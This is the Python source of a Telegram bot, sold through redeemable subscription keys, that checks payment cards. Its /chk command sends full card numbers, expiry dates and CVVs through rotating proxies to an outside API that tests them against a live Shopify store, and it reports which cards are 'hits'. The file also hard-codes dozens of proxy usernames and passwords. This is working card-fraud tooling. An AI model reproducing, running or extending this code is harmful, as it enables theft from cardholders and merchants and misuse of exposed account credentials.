import os
import logging
import uuid
import time
import json
import random
import httpx
from telegram import Update
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters
from urllib.parse import quote
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# Render / Web Service Dummy HTTP Server to prevent 'Application exited early' error
class SimpleHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Bot is alive and running!")

def run_server():
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(("0.0.0.0", port), SimpleHandler)
    logger.info(f"Dummy HTTP server started on port {port}")
    server.serve_forever()

TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
OWNER_USERNAME = "@ESCROW2929"
AUTHORIZED_ADMINS = {8785590284}
DATA_FILE = "users_data.json"

# Complete Updated Proxy List
PROXY_LIST = [
    "reseller3270s320237:7Grp9Gki@px052001.pointtoserver.com:10780",
    "reseller3270s320237:7Grp9Gki@px051003.pointtoserver.com:10780",
    "reseller3270s320237:7Grp9Gki@px043006.pointtoserver.com:10780",
    "reseller3270s320237:7Grp9Gki@px410701.pointtoserver.com:10780",
    "reseller3270s320237:7Grp9Gki@px015601.pointtoserver.com:10780",
    "reseller3270s320237:7Grp9Gki@px490701.pointtoserver.com:10780",
    "reseller3270s320237:7Grp9Gki@px591801.pointtoserver.com:10780",
    "reseller3270s320237:7Grp9Gki@px022409.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px022505.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px022507.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px052001.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px051003.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px043006.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px410701.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px015601.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px490701.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px591801.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px022409.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px022408.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px173003.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px420602.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px031901.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px490402.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px460101.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px490401.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px041201.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px041202.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px470108.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px023004.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px023005.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px043005.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px043004.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px032004.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px014004.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px032002.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px040706.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px460403.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px400501.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px380101.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px013301.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px019603.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px520401.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px014236.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px040805.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px121102.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px121101.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px013304.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px440401.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px016104.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px180801.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px121001.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px150902.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px270401.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px591203.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px591201.pointtoserver.com:10780",
    "naveed:Qwerty_123ABC@196.244.48.124:12345",
    "harishankarchoubey:HvCjWdoIrK6szj8v@136.179.19.164:3128",
    "naveed:Qwerty_123ABC@196.244.48.26:12345",
    "llewellynashleybowen:rNXaRJfNPN233zw@136.179.19.164:3128",
    "naveed:Qwerty_123ABC@196.244.48.126:12345",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ca-tor.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@im-bal.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@au-syd.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@jp-tok.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@sg-sin.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@it-mil.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@au-mel.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@id-jak.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@au-bri.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@nz-auc.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@pl-tor.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@th-ban.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@fr-par.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ph-man.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@dk-cop.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@kr-seo.pvdata.host:8080",
    "purevpn0s12153504:1LTpwxbCJbEdXo@px460403.pointtoserver.com:10780",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@se-sto.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@fi-esp.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@au-per.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@hu-bud.pvdata.host:8080",
    "3700900107896:ratchaburi79@202.41.171.9:2086",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ee-tal.pvdata.host:8080",
    "s6402011520288:surikan123@202.28.17.8:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ie-dub.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@il-tel.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@hk-hon.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@md-chi.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ro-buk.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@lt-sia.pvdata.host:8080"
]

def load_data():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r") as f:
                data = json.load(f)
                return (
                    set(data.get("all_users", [])),
                    set(data.get("banned_users", [])),
                    set(data.get("sub_admins", [])),
                    data.get("active_keys", {}),
                    {int(k): v for k, v in data.get("user_subscriptions", {}).items()}
                )
        except Exception as e:
            logger.error(f"Error loading data: {e}")
    return set(), set(), set(), {}, {}

def save_data():
    data = {
        "all_users": list(ALL_USERS),
        "banned_users": list(BANNED_USERS),
        "sub_admins": list(SUB_ADMINS),
        "active_keys": ACTIVE_KEYS,
        "user_subscriptions": USER_SUBSCRIPTIONS
    }
    try:
        with open(DATA_FILE, "w") as f:
            json.dump(data, f)
    except Exception as e:
        logger.error(f"Error saving data: {e}")

ALL_USERS, BANNED_USERS, SUB_ADMINS, ACTIVE_KEYS, USER_SUBSCRIPTIONS = load_data()

def is_main_admin(user_id):
    return user_id in AUTHORIZED_ADMINS

def is_any_admin(user_id):
    return user_id in AUTHORIZED_ADMINS or user_id in SUB_ADMINS

def parse_time_to_seconds(time_str):
    time_str = time_str.lower().strip()
    try:
        if 'd' in time_str:
            days = int(time_str.replace('d', ''))
            return days * 86400
        elif 'hour' in time_str or 'h' in time_str:
            hours = int(time_str.replace('hour', '').replace('h', '').strip())
            return hours * 3600
        elif 'm' in time_str:
            mins = int(time_str.replace('m', '').strip())
            return mins * 60
    except ValueError:
        pass
    return 86400

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in BANNED_USERS:
        await update.message.reply_text("❌ You are banned from using this bot.")
        return
    ALL_USERS.add(user_id)
    save_data()
    user = update.effective_user
    await update.message.reply_text(
        f"Hello {user.first_name}!\n\n"
        f"🤖 Shopify CC Checker Bot is Online\n"
        f"⚠️ Note: Use /redeem <key> to activate your access before checking cards.\n\n"
        f"👑 Owner: {OWNER_USERNAME}"
    )

async def admin_pannel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_any_admin(user_id):
        await update.message.reply_text("❌ You are not authorized to use the Admin Panel.")
        return
    panel_message = (
        f"🛠 Admin Panel & Controls\n\n"
        f"• Gateway: Shopify API Connected ✅\n"
        f"• Total Proxies Loaded: {len(PROXY_LIST)}\n"
        f"• Total Active Users Tracked: {len(ALL_USERS)}\n"
        f"• Total Keys in System: {len(ACTIVE_KEYS)}\n"
        f"• Sub-Admins: {len(SUB_ADMINS)}\n"
        f"• Banned Users: {len(BANNED_USERS)}\n\n"
        f"Available Commands:\n"
        f"/key <quantity> <time> (e.g., /key 25 1d)\n"
        f"/users (To see all users)\n"
        f"/announcement <message>\n"
    )
    if is_main_admin(user_id):
        panel_message += "/makeadmin <id>\n/removeadmin <id>\n/ban <id>\n/unban <id>"
    await update.message.reply_text(panel_message)

async def show_users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_any_admin(user_id):
        await update.message.reply_text("❌ Unauthorized.")
        return
    users_list = list(ALL_USERS)
    users_text = "\n".join([str(uid) for uid in users_list[:50]])
    response = f"👥 **Total Tracked Users:** {len(ALL_USERS)}\n\nFirst 50 User IDs:\n{users_text}"
    if len(response) > 4000:
        await update.message.reply_text(f"👥 Total Tracked Users: {len(ALL_USERS)}")
    else:
        await update.message.reply_text(response, parse_mode="Markdown")

async def announcement_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_any_admin(user_id):
        await update.message.reply_text("❌ You are not authorized.")
        return
    if not context.args:
        await update.message.reply_text("❌ Usage: /announcement Your message here")
        return
    broadcast_msg = "📢 Announcement:\n\n" + " ".join(context.args)
    sent_count, fail_count = 0, 0
    status_msg = await update.message.reply_text("⏳ Broadcasting announcement...")
    for uid in list(ALL_USERS):
        try:
            await context.bot.send_message(chat_id=uid, text=broadcast_msg)
            sent_count += 1
        except Exception:
            fail_count += 1
    await context.bot.edit_message_text(
        chat_id=update.effective_chat.id,
        message_id=status_msg.message_id,
        text=f"✅ Broadcast Completed!\n\n• Sent: {sent_count}\n• Failed: {fail_count}"
    )

async def generate_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_any_admin(user_id):
        await update.message.reply_text("❌ Unauthorized.")
        return
    if len(context.args) < 2:
        await update.message.reply_text("❌ Usage: /key <quantity> <time>\nExample: /key 25 1d")
        return
    try:
        qty = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ Quantity must be a number.")
        return
    time_str = context.args[1]
    duration_secs = parse_time_to_seconds(time_str)
    generated_keys_list = []
    for _ in range(qty):
        unique_suffix = uuid.uuid4().hex[:8].upper()
        key_str = f"PRIME-{unique_suffix}"
        ACTIVE_KEYS[key_str] = {"duration_seconds": duration_secs, "used_by": None, "expiry_time": None}
        generated_keys_list.append(key_str)
    save_data()
    keys_text = "\n".join([f"`{k}`" for k in generated_keys_list])
    response_msg = f"🔑 {qty} Keys Generated Successfully!\n⏱ Duration: {time_str}\n\n{keys_text}"
    if len(response_msg) > 4000:
        await update.message.reply_text(f"🔑 {qty} Keys generated successfully! (List is too long).", parse_mode="Markdown")
    else:
        await update.message.reply_text(response_msg, parse_mode="Markdown")

async def redeem_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in BANNED_USERS:
        await update.message.reply_text("❌ You are banned.")
        return
    ALL_USERS.add(user_id)
    save_data()
    if not context.args:
        await update.message.reply_text("❌ Usage: /redeem PRIME-XXXXXXXX")
        return
    user_key = context.args[0].strip().upper()
    if user_key not in ACTIVE_KEYS:
        await update.message.reply_text("❌ Invalid Key!")
        return
    key_data = ACTIVE_KEYS[user_key]
    if key_data["used_by"] is not None:
        await update.message.reply_text("❌ Key already used!")
        return
    current_time = time.time()
    expiry_timestamp = current_time + key_data["duration_seconds"]
    key_data["used_by"] = user_id
    key_data["expiry_time"] = expiry_timestamp
    USER_SUBSCRIPTIONS[user_id] = expiry_timestamp
    save_data()
    await update.message.reply_text("✅ Key Successfully Redeemed!\n🎉 Premium access active.")

async def make_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_main_admin(update.effective_user.id):
        return
    if context.args:
        try:
            new_admin = int(context.args[0])
            SUB_ADMINS.add(new_admin)
            save_data()
            await update.message.reply_text(f"✅ Added {new_admin}")
        except ValueError:
            pass

async def remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_main_admin(update.effective_user.id):
        return
    if context.args:
        try:
            target = int(context.args[0])
            if target in SUB_ADMINS:
                SUB_ADMINS.remove(target)
                save_data()
                await update.message.reply_text(f"✅ Removed {target}")
        except ValueError:
            pass

async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_main_admin(update.effective_user.id):
        return
    if context.args:
        try:
            target = int(context.args[0])
            BANNED_USERS.add(target)
            save_data()
            await update.message.reply_text(f"🚫 Banned {target}")
        except ValueError:
            pass

async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_main_admin(update.effective_user.id):
        return
    if context.args:
        try:
            target = int(context.args[0])
            if target in BANNED_USERS:
                BANNED_USERS.remove(target)
                save_data()
                await update.message.reply_text(f"✅ Unbanned {target}")
        except ValueError:
            pass

def has_access(user_id):
    if is_any_admin(user_id):
        return True
    if user_id in USER_SUBSCRIPTIONS:
        if time.time() < USER_SUBSCRIPTIONS[user_id]:
            return True
        else:
            del USER_SUBSCRIPTIONS[user_id]
            save_data()
            return False
    return False

async def get_bin_info(bin_code):
    try:
        async with httpx.AsyncClient(timeout=10.0) as client:
            res = await client.get(f"https://lookup.binlist.net/{bin_code}")
            if res.status_code == 200:
                data = res.json()
                scheme = data.get("scheme", "UNKNOWN").upper()
                type_val = data.get("type", "UNKNOWN").upper()
                brand = data.get("brand", "").upper()
                bank_name = data.get("bank", {}).get("name", "UNKNOWN").upper()
                country_name = data.get("country", {}).get("name", "UNKNOWN").upper()
                country_emoji = data.get("country", {}).get("emoji", "")
                bin_desc = f"{scheme} - {type_val}"
                if brand:
                    bin_desc += f" - {brand}"
                return bin_desc, bank_name, f"{country_name} {country_emoji}"
    except Exception:
        pass
    return "UNKNOWN - UNKNOWN", "UNKNOWN", "UNKNOWN"

async def process_card_string(card_line, user_full_name):
    try:
        parts = card_line.split('|')
        if len(parts) < 4:
            return f"❌ {card_line} ➔ Invalid Format"
        
        cc, mes, ano, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
        formatted_cc = f"{cc}|{mes}|{ano}|{cvv}"
        full_card_display = f"{cc}|{mes}|{ano}|{cvv}"
        bin_code = cc[:6]
        
        bin_info, bank_info, country_info = await get_bin_info(bin_code)
        
        site_url = "https://customsbyarrillc.myshopify.com"
        selected_proxy = random.choice(PROXY_LIST)
        
        api_url = f"http://rhaenyra.xyz/shopify?cc={quote(formatted_cc)}&url={quote(site_url)}&proxy={quote(selected_proxy)}"
        
        
        async with httpx.AsyncClient(timeout=60.0, follow_redirects=True) as client:
            response = await client.get(api_url)
            if response.status_code != 200:
                return f"❌ {card_line} ➔ API Server Error (Status Code: {response.status_code})"
            res_data = response.json()
        
        resp_status = res_data.get("Response", "UNKNOWN")
        price = res_data.get("Price", "$14.97")
        gate = res_data.get("Gate", "Shopify Payments")
        approved = res_data.get("Approved", "False")
        charged = res_data.get("Charged", "False")
        
        is_success = (approved.lower() == "true" or charged.lower() == "true" or "approved" in resp_status.lower() or "success" in resp_status.lower())
        hit_title = "⚡💠 𝐇𝐢𝐭 𝐅𝐨𝐮𝐧𝐝!" if is_success else "❌💠 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝!"
        
        return (
            f"⚡💳  # PRIME CHECKER  💳⚡\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"{hit_title}\n"
            f"⚠️ Status: {resp_status}\n"
            f"💳 Card: {full_card_display}\n"
            f"📝 Response: {resp_status}\n"
            f"🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gate} | 💰 {price}\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨\n"
            f"𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info}\n"
            f"𝗕𝗮𝗻𝗸: {bank_info}\n"
            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_info}\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"👤 Cʜᴇᴄᴋᴇᴅ Bʏ ➠ {user_full_name}\n"
            f"🤖 Bot By: PRIME, SIMPLE BOY, SHINCHAN"
        )
            
    except httpx.TimeoutException:
        return f"❌ {card_line} ➔ API Timeout (Server took too long to respond)"
    except Exception as e:
        logger.error(f"Processing error: {str(e)}")
        return f"❌ {card_line} ➔ API Error / Connection Failed"

async def chk_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in BANNED_USERS:
        return
    ALL_USERS.add(user_id)
    save_data()
    if not has_access(user_id):
        await update.message.reply_text("❌ Subscription expired or no key redeemed. Use /redeem <key>.")
        return
    if not context.args:
        await update.message.reply_text("❌ Usage: /chk CC|MM|YY|CVV")
        return
    card_line = "".join(context.args)
    user_full_name = update.effective_user.first_name
    
    msg = await update.message.reply_text("⏳ Processing card...")
    result = await process_card_string(card_line, user_full_name)
    await context.bot.edit_message_text(
        chat_id=update.effective_chat.id,
        message_id=msg.message_id,
        text=result
    )

def main():
    if not TOKEN:
        logger.error("TELEGRAM_BOT_TOKEN environment variable is missing!")
        return

    # Start dummy HTTP server in background thread for Render
    server_thread = threading.Thread(target=run_server)
    server_thread.daemon = True
    server_thread.start()

    application = ApplicationBuilder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("admin", admin_pannel))
    application.add_handler(CommandHandler("users", show_users_command))
    application.add_handler(CommandHandler("announcement", announcement_command))
    application.add_handler(CommandHandler("key", generate_key))
    application.add_handler(CommandHandler("redeem", redeem_key))
    application.add_handler(CommandHandler("makeadmin", make_admin))
    application.add_handler(CommandHandler("removeadmin", remove_admin))
    application.add_handler(CommandHandler("ban", ban_user))
    application.add_handler(CommandHandler("unban", unban_user))
    application.add_handler(CommandHandler("chk", chk_card))

    logger.info("Bot is starting polling...")
    application.run_polling()

if __name__ == "__main__":
    main()
